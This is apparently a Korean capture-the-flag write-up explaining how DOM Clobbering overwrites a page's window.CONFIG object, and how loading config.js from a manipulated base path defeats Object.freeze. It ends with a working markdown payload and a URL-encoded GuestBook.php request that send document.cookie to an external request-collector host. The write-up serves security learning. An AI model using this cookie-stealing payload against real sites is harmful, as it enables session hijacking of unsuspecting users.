## 풀이

DOM Clobbering을 활용한 문제
DOM Clobbering은 DOM에서 사용중인 global 변수를 덮어쓰는 공격 기법이다.
기본적으로 사용하고 있는 window.CONFIG 와 같은 변수를 DOM에 있는 element로 덮어쓰는 방식이다.

[참고링크](https://intadd.tistory.com/143)

해당 기술을 활용하여 CONFIG.main, CONFIG.debug를 덮어쓸 수 있고,
그러면 페이지 스크립트에서 window.CONFIG를 불러올때 location.href를 실행시킬 수 있고,
이를 활용해 자동으로 쿠키를 탈취하는 페이로드를 작성할 수 있다.

이때 기본적으로 작성된 config.js에서 Object.freeze를 하고 있는데,
이는 base 경로를 조작하는 것으로 우회할 수 있다.
로컬호스트 입장에서 config.js를 찾으려 할 때 해당 경로에 없기 때문에 우회 가능하다.

```markdown
[](#' id='CONFIG' name='debug)
[](#' id='CONFIG)
[](javascript:location.href="https://uxqetzz.request.dreamhack.games/memo?memo="+document.cookie;' id='CONFIG' name='main)

/GuestBook.php/asdf?content=%5B%5D%28%23%27+id%3D%27CONFIG%27+name%3D%27debug%29%0D%0A%5B%5D%28%23%27+id%3D%27CONFIG%29%0D%0A%5B%5D%28javascript%3Alocation.href%3D"https%3A%2F%2Fuxqetzz.request.dreamhack.games%2Fmemo%3Fmemo%3D"%2Bdocument.cookie%3B%27+id%3D%27CONFIG%27+name%3D%27main%29
```